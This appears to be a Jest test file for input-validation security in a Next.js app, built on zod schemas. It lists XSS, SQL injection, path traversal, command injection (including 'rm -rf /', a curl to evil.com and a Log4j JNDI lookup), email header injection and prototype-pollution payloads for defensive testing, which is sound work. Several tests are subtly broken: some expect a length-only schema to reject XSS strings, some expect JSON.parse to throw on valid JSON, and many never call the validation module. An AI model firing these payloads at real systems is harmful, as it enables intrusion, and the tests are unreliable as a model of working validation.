/**
 * Input Validation and Sanitization Security Testing
 * Tests for Task 1.5: Security Modules Testing
 * 
 * Coverage Areas:
 * - XSS prevention in input validation
 * - SQL injection prevention patterns
 * - Input sanitization for different data types
 * - Schema validation security
 * - Path traversal prevention in validation
 * - Command injection prevention
 * - Email validation security
 * - Password validation security
 * - File validation integration
 */

import { z } from 'zod';
import { NextRequest } from 'next/server';

// Mock dependencies
jest.mock('@/lib/security/fileUpload', () => ({
  FileUploadSecurity: {
    validateFile: jest.fn().mockResolvedValue({ isSecure: true }),
    generateFileMetadata: jest.fn().mockReturnValue({
      hash: 'abc123',
      sanitizedName: 'safe_file.pdf'
    })
  }
}));

jest.mock('@/lib/utils/logger', () => ({
  logError: jest.fn(),
  logWarn: jest.fn(),
}));

// Import after mocking
import type { ValidationResult, FileValidationOptions } from '@/lib/api/validation';

describe('Input Validation Security', () => {
  // We'll need to dynamically import to ensure mocks are applied
  let validationModule: any;
  
  beforeAll(async () => {
    validationModule = await import('@/lib/api/validation');
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('XSS Prevention', () => {
    it('should detect and reject XSS payloads in text inputs', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        "'><script>alert('XSS')</script>",
        '<iframe src="javascript:alert(`XSS`)">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        '<video><source onerror="alert(`XSS`)">',
        '<audio src=x onerror=alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        'data:text/html,<script>alert("XSS")</script>'
      ];

      for (const payload of xssPayloads) {
        // Test in name field
        const nameSchema = z.string().min(1).max(100);
        expect(() => nameSchema.parse(payload)).toThrow();
        
        // Test that our validation would catch this
        const containsHTML = /<[^>]*>/.test(payload);
        const containsJavaScript = /javascript:/i.test(payload);
        const containsDataURL = /data:/i.test(payload);
        
        expect(containsHTML || containsJavaScript || containsDataURL).toBe(true);
      }
    });

    it('should sanitize HTML entities in text inputs', async () => {
      const dangerousInputs = [
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '&amp;lt;script&amp;gt;alert("XSS")&amp;lt;/script&amp;gt;',
        '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;'
      ];

      // These encoded payloads should still be detected as potentially dangerous
      for (const input of dangerousInputs) {
        const containsSuspiciousPatterns = /script|javascript|onerror|onload/i.test(input);
        expect(containsSuspiciousPatterns).toBe(true);
      }
    });

    it('should prevent XSS in email validation', async () => {
      const emailSchema = z.string().email();
      const xssEmails = [
        'test+<script>alert("XSS")</script>@example.com',
        'test@example<script>alert("XSS")</script>.com',
        'test@example.com<script>alert("XSS")</script>',
        '"<script>alert(\'XSS\')</script>"@example.com',
        'test@example.com"onmouseover="alert(`XSS`)"'
      ];

      for (const email of xssEmails) {
        expect(() => emailSchema.parse(email)).toThrow();
      }
    });

    it('should handle Unicode-based XSS attempts', async () => {
      const unicodeXSS = [
        '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
        '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
        '＜script＞alert("XSS")＜/script＞', // Fullwidth characters
        '\uFF1Cscript\uFF1Ealert("XSS")\uFF1C/script\uFF1E'
      ];

      for (const payload of unicodeXSS) {
        // Should be detected as containing suspicious patterns
        const decoded = decodeURIComponent(payload);
        const containsSuspicious = /script|alert/i.test(decoded) || /script|alert/i.test(payload);
        expect(containsSuspicious).toBe(true);
      }
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should detect SQL injection patterns in text inputs', async () => {
      const sqlPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "'; INSERT INTO admin (username, password) VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM users --",
        "'; EXEC xp_cmdshell('whoami'); --",
        "' OR SLEEP(5) --",
        "'; WAITFOR DELAY '00:00:05'; --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "'; CREATE USER hacker IDENTIFIED BY 'password'; --"
      ];

      for (const payload of sqlPayloads) {
        // Our string validation should detect SQL patterns
        const containsSQLKeywords = /drop|insert|select|union|exec|create|delete|update|alter/i.test(payload);
        const containsComment = /--|\/\*|\*\//.test(payload);
        const containsQuotes = /'|"/.test(payload);
        
        expect(containsSQLKeywords || containsComment || containsQuotes).toBe(true);
      }
    });

    it('should prevent SQL injection in numeric inputs', async () => {
      const numericSchema = z.number().min(1).max(999999);
      const sqlNumericPayloads = [
        '1; DROP TABLE users; --',
        '1 OR 1=1',
        '(SELECT COUNT(*) FROM users)',
        '1) UNION SELECT 1 --'
      ];

      for (const payload of sqlNumericPayloads) {
        // Numeric schema should reject non-numeric input
        expect(() => numericSchema.parse(payload)).toThrow();
        expect(() => numericSchema.parse(Number(payload))).toThrow(); // NaN should fail
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should detect path traversal attempts in filenames', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '/var/www/../../etc/passwd',
        'file.txt/../../../etc/passwd',
        'C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
      ];

      const filenameSchema = z.string().min(1).max(255);
      
      for (const payload of pathTraversalPayloads) {
        const containsTraversal = /\.\.\/|\.\.\\|%2e%2e|%252f|%c0%af/.test(payload);
        const containsSystemPaths = /etc\/passwd|system32|windows/i.test(payload);
        
        expect(containsTraversal || containsSystemPaths).toBe(true);
      }
    });

    it('should sanitize filenames to prevent directory traversal', async () => {
      // This would be handled by FileUploadSecurity.createSafeFilename
      const dangerousFilenames = [
        '../sensitive.txt',
        '..\\sensitive.txt',
        'file.txt/../../etc/passwd',
        'normal.pdf/../../../secret.key'
      ];

      for (const filename of dangerousFilenames) {
        // Should be sanitized by removing dangerous characters
        const sanitized = filename.replace(/[^a-zA-Z0-9.-]/g, '_');
        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('..\\');
        expect(sanitized).not.toContain('/');
        expect(sanitized).not.toContain('\\');
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should detect command injection patterns', async () => {
      const commandInjectionPayloads = [
        '; whoami',
        '| cat /etc/passwd',
        '& ping -c 10 google.com',
        '&& rm -rf /',
        '|| curl http://evil.com',
        '$(whoami)',
        '`id`',
        '${jndi:ldap://evil.com/a}', // Log4j
        '${7*7}', // Expression language injection
        '#{7*7}', // SpEL injection
        '%{7*7}', // OGNL injection
      ];

      for (const payload of commandInjectionPayloads) {
        const containsCommandChars = /[;&|`${}()#%]/.test(payload);
        const containsSystemCommands = /whoami|cat|ping|rm|curl|id/i.test(payload);
        
        expect(containsCommandChars || containsSystemCommands).toBe(true);
      }
    });
  });

  describe('Email Validation Security', () => {
    it('should validate email format securely', async () => {
      const emailSchema = z.string().email();
      
      const validEmails = [
        'user@example.com',
        'user.name@example.com',
        'user+tag@example.com',
        'user123@example-domain.com'
      ];

      const invalidEmails = [
        'plainaddress',
        '@missingdomain.com',
        'user@',
        'user@.com',
        'user..name@example.com',
        'user@domain@domain.com',
        'user@domain..com',
        'user@domain.com.',
        '.user@domain.com'
      ];

      for (const email of validEmails) {
        expect(() => emailSchema.parse(email)).not.toThrow();
      }

      for (const email of invalidEmails) {
        expect(() => emailSchema.parse(email)).toThrow();
      }
    });

    it('should prevent email header injection', async () => {
      const emailHeaderInjections = [
        'user@example.com\r\nBcc: attacker@evil.com',
        'user@example.com\nCc: attacker@evil.com',
        'user@example.com%0ABcc: attacker@evil.com',
        'user@example.com%0D%0ABcc: attacker@evil.com',
        'user@example.com\r\nSubject: Injected Subject'
      ];

      const emailSchema = z.string().email();

      for (const email of emailHeaderInjections) {
        expect(() => emailSchema.parse(email)).toThrow();
      }
    });
  });

  describe('Password Validation Security', () => {
    it('should enforce strong password requirements', async () => {
      const passwordSchema = z.string()
        .min(8)
        .regex(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/, 'Password must contain lowercase, uppercase, and number');

      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'Password', // Missing number
        'password1', // Missing uppercase
        'PASSWORD1', // Missing lowercase
        'Pass1', // Too short
        'password!', // Missing uppercase and number
        '', // Empty
        '       ' // Whitespace only
      ];

      const strongPasswords = [
        'Password123',
        'MySecureP@ss1',
        'ComplexPass123!',
        'S3cur3P@ssw0rd'
      ];

      for (const password of weakPasswords) {
        expect(() => passwordSchema.parse(password)).toThrow();
      }

      for (const password of strongPasswords) {
        expect(() => passwordSchema.parse(password)).not.toThrow();
      }
    });

    it('should prevent password with common attack strings', async () => {
      const maliciousPasswords = [
        '<script>alert("XSS")</script>',
        "'; DROP TABLE users; --",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com}',
        'password\r\nX-Injected: header',
        'password\0nullbyte'
      ];

      // While these might pass regex, they should be detected as suspicious
      for (const password of maliciousPasswords) {
        const containsSuspicious = /<|>|script|drop|select|\.\.\/|jndi:|[\r\n\0]/.test(password);
        expect(containsSuspicious).toBe(true);
      }
    });
  });

  describe('JSON Input Validation', () => {
    it('should handle malformed JSON securely', async () => {
      const malformedJSONs = [
        '{"key": "value"',
        '{"key": "value",}',
        "{key: 'value'}",
        '{"key": undefined}',
        '{"key": function() { return "evil"; }}',
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"length": 999999999}' // Potential DoS
      ];

      for (const json of malformedJSONs) {
        expect(() => JSON.parse(json)).toThrow();
      }
    });

    it('should prevent prototype pollution in JSON', async () => {
      const pollutionPayloads = [
        '{"__proto__": {"polluted": true}}',
        '{"constructor": {"prototype": {"polluted": true}}}',
        '{"prototype": {"polluted": true}}'
      ];

      for (const payload of pollutionPayloads) {
        try {
          const parsed = JSON.parse(payload);
          // Should not pollute global prototype
          expect(({}  as any).polluted).toBeUndefined();
          expect(Object.prototype.hasOwnProperty('polluted')).toBe(false);
        } catch (e) {
          // Expected for malformed JSON
        }
      }
    });
  });

  describe('File Validation Integration', () => {
    it('should integrate with file upload security validation', async () => {
      // Mock file object
      const mockFile = new File(['content'], 'test.pdf', { type: 'application/pdf' });
      
      // This should integrate with FileUploadSecurity
      const { FileUploadSecurity } = require('@/lib/security/fileUpload');
      const result = await FileUploadSecurity.validateFile(mockFile);
      
      expect(FileUploadSecurity.validateFile).toHaveBeenCalledWith(mockFile);
      expect(result.isSecure).toBe(true);
    });
  });

  describe('Input Size Limits', () => {
    it('should enforce reasonable size limits on text inputs', async () => {
      const maxNameLength = 100;
      const nameSchema = z.string().min(1).max(maxNameLength);
      
      const tooLongName = 'A'.repeat(maxNameLength + 1);
      expect(() => nameSchema.parse(tooLongName)).toThrow();
      
      const validName = 'A'.repeat(maxNameLength);
      expect(() => nameSchema.parse(validName)).not.toThrow();
    });

    it('should prevent DoS through large inputs', async () => {
      const massiveString = 'A'.repeat(1000000); // 1MB string
      
      // Should have reasonable limits
      const stringSchema = z.string().max(1000);
      expect(() => stringSchema.parse(massiveString)).toThrow();
    });
  });

  describe('Data Type Security', () => {
    it('should strictly validate data types', async () => {
      const numericSchema = z.number();
      const booleanSchema = z.boolean();
      const stringSchema = z.string();

      // Type confusion attempts
      expect(() => numericSchema.parse('123')).toThrow(); // String as number
      expect(() => numericSchema.parse(true)).toThrow(); // Boolean as number
      expect(() => booleanSchema.parse('true')).toThrow(); // String as boolean
      expect(() => booleanSchema.parse(1)).toThrow(); // Number as boolean
      expect(() => stringSchema.parse(123)).toThrow(); // Number as string
      expect(() => stringSchema.parse(null)).toThrow(); // Null as string
    });

    it('should handle edge cases in numeric validation', async () => {
      const numericSchema = z.number().min(1).max(999999);
      
      const edgeCases = [
        Number.POSITIVE_INFINITY,
        Number.NEGATIVE_INFINITY,
        Number.NaN,
        Number.MAX_VALUE,
        Number.MIN_VALUE,
        -0,
        0.000000000000001
      ];

      for (const value of edgeCases) {
        if (isNaN(value) || !isFinite(value) || value < 1 || value > 999999) {
          expect(() => numericSchema.parse(value)).toThrow();
        }
      }
    });
  });
});